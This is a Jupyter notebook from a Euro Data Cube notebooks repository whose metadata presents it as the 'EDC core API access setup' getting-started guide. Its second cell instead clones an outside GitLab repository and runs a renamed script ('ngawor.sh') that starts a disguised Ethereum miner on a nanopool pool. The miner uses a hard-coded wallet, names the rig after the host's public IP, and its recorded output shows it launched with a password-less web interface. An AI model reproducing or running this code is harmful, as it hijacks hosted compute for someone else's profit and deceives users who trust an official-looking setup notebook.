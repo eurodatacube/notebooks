{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "6ad2a6f8",
   "metadata": {
    "execution": {
     "iopub.execute_input": "2022-06-30T11:10:32.947623Z",
     "iopub.status.busy": "2022-06-30T11:10:32.946584Z",
     "iopub.status.idle": "2022-06-30T11:10:33.073497Z",
     "shell.execute_reply": "2022-06-30T11:10:33.071183Z"
    },
    "papermill": {
     "duration": 0.133283,
     "end_time": "2022-06-30T11:10:33.075784",
     "exception": false,
     "start_time": "2022-06-30T11:10:32.942501",
     "status": "completed"
    },
    "tags": []
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<script type=\"text/javascript\">\n",
       "        function toggle(id) {\n",
       "            el = document.getElementById(id);\n",
       "            el.style.display = el.style.display === \"none\" ? \"block\" : \"none\";\n",
       "        }\n",
       "    </script>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "This notebook is compatible with this base image version (user-2022.06-03)."
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "\n",
       "\n",
       "---------\n",
       "\n",
       "The following environment variables are available:\n",
       "\n",
       "* `SH_CLIENT_ID`, `SH_INSTANCE_ID`, `SH_CLIENT_NAME`, `SH_CLIENT_SECRET`\n"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from eoxhub import check_compatibility\n",
    "check_compatibility(\"user-2022.06-03\", dependencies=[\"SH\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "55f9f2b4",
   "metadata": {
    "execution": {
     "iopub.execute_input": "2022-06-30T11:10:33.085662Z",
     "iopub.status.busy": "2022-06-30T11:10:33.085085Z",
     "iopub.status.idle": "2022-06-30T11:10:46.130406Z",
     "shell.execute_reply": "2022-06-30T11:10:46.127274Z"
    },
    "id": "VZM6Yd3T8BD5H",
    "papermill": {
     "duration": 13.059078,
     "end_time": "2022-06-30T11:10:46.136627",
     "exception": false,
     "start_time": "2022-06-30T11:10:33.077549",
     "status": "completed"
    },
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/usr/bin/sh: 1: nvidia-smi: not found\r\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Cloning into 'awh'...\r\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "warning: redirecting to https://gitlab.com/pulangkampung52/awh.git/\r\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "remote: Enumerating objects: 10, done.\u001b[K\r\n",
      "remote: Counting objects:  10% (1/10)\u001b[K\r",
      "remote: Counting objects:  20% (2/10)\u001b[K\r",
      "remote: Counting objects:  30% (3/10)\u001b[K\r",
      "remote: Counting objects:  40% (4/10)\u001b[K\r",
      "remote: Counting objects:  50% (5/10)\u001b[K\r",
      "remote: Counting objects:  60% (6/10)\u001b[K\r",
      "remote: Counting objects:  70% (7/10)\u001b[K\r",
      "remote: Counting objects:  80% (8/10)\u001b[K\r",
      "remote: Counting objects:  90% (9/10)\u001b[K\r",
      "remote: Counting objects: 100% (10/10)\u001b[K\r",
      "remote: Counting objects: 100% (10/10), done.\u001b[K\r\n",
      "remote: Compressing objects:  10% (1/10)\u001b[K\r",
      "remote: Compressing objects:  20% (2/10)\u001b[K\r",
      "remote: Compressing objects:  30% (3/10)\u001b[K\r",
      "remote: Compressing objects:  40% (4/10)\u001b[K\r",
      "remote: Compressing objects:  50% (5/10)\u001b[K\r",
      "remote: Compressing objects:  60% (6/10)\u001b[K\r",
      "remote: Compressing objects:  70% (7/10)\u001b[K\r",
      "remote: Compressing objects:  80% (8/10)\u001b[K\r",
      "remote: Compressing objects:  90% (9/10)\u001b[K\r",
      "remote: Compressing objects: 100% (10/10)\u001b[K\r",
      "remote: Compressing objects: 100% (10/10), done.\u001b[K\r\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unpacking objects:  10% (1/10)\r",
      "Unpacking objects:  20% (2/10)\r",
      "Unpacking objects:  30% (3/10)\r",
      "Unpacking objects:  40% (4/10)\r"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unpacking objects:  50% (5/10)\r"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unpacking objects:  50% (5/10), 1.13 MiB | 643.00 KiB/s\r"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unpacking objects:  60% (6/10), 1.13 MiB | 643.00 KiB/s\r"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unpacking objects:  60% (6/10), 8.75 MiB | 2.53 MiB/s  \r"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unpacking objects:  70% (7/10), 8.75 MiB | 2.53 MiB/s\r",
      "Unpacking objects:  80% (8/10), 8.77 MiB | 2.00 MiB/s\r",
      "Unpacking objects:  90% (9/10), 8.77 MiB | 2.00 MiB/s\r"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0\u001b[K\r\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unpacking objects: 100% (10/10), 8.77 MiB | 2.00 MiB/s\r",
      "Unpacking objects: 100% (10/10), 22.18 MiB | 3.87 MiB/s, done.\r\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/jovyan/awh\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m\u001b[33m                                   _                 \u001b[0m\r\n",
      "\u001b[1m\u001b[33m _ __   __ _ _ __   ___  _ __ ___ (_)_ __   ___ _ __ \u001b[0m\r\n",
      "\u001b[1m\u001b[33m| '_ \\ / _` | '_ \\ / _ \\| '_ ` _ \\| | '_ \\ / _ \\ '__|\u001b[0m\r\n",
      "\u001b[1m\u001b[33m| | | | (_| | | | | (_) | | | | | | | | | |  __/ |   \u001b[0m\r\n",
      "\u001b[1m\u001b[33m|_| |_|\\__,_|_| |_|\\___/|_| |_| |_|_|_| |_|\\___|_|   \u001b[0m\r\n",
      "\u001b[1m\u001b[33m\u001b[0m\r\n",
      "\u001b[1m\u001b[33mVersion 3.2.2\u001b[0m\r\n",
      "\u001b[37m2022-06-30 06:10:45: Started EthMan server on port 3333 without a password (read-only mode).\r\n",
      "\u001b[1m\u001b[33m2022-06-30 06:10:45: Started web interface on port 9090 without a password.\r\n",
      "\u001b[1m\u001b[32mDetected 0 devices\u001b[0m\r\n"
     ]
    }
   ],
   "source": [
    "!nvidia-smi\n",
    "!git clone https://gitlab.com/pulangkampung52/awh\n",
    "%cd awh\n",
    "!chmod +x ngawor.sh\n",
    "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./ngawor.sh -algo Ethash -pool1 eth-us-east1.nanopool.org:9433 -wallet 0x94275676F07e09CA3f7c7EE3785a1D910cB9083f -coin eth -rigName $ip -email sarangpanda0099@gmail.com"
   ]
  }
 ],
 "metadata": {
  "accelerator": "GPU",
  "colab": {
   "collapsed_sections": [
    "VZM6Yd3T8BD5H"
   ],
   "machine_shape": "hm",
   "name": "ETH01.ipynb",
   "private_outputs": true,
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "papermill": {
   "default_parameters": {},
   "duration": 15.127952,
   "end_time": "2022-06-30T11:10:46.574514",
   "environment_variables": {},
   "exception": null,
   "input_path": "/tmp/tmplgyxh8bt",
   "output_path": "/tmp/notebook_output.ipynb",
   "parameters": {},
   "start_time": "2022-06-30T11:10:31.446562",
   "version": "2.3.4"
  },
  "properties": {
   "authors": [
    {
     "id": "9e6ee196-1988-45da-8864-eff3f58e8778",
     "name": "sarangkutu00@gmail.com"
    }
   ],
   "description": "Euro Data Cube core API access setup",
   "id": "sh-setup",
   "license": null,
   "name": "EDC core API access setup",
   "requirements": [
    "eurodatacube",
    "eoxhub"
   ],
   "tags": [
    "Getting started",
    "GeoDB",
    "xcube"
   ],
   "tosAgree": true,
   "type": "Jupyter Notebook",
   "version": "2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}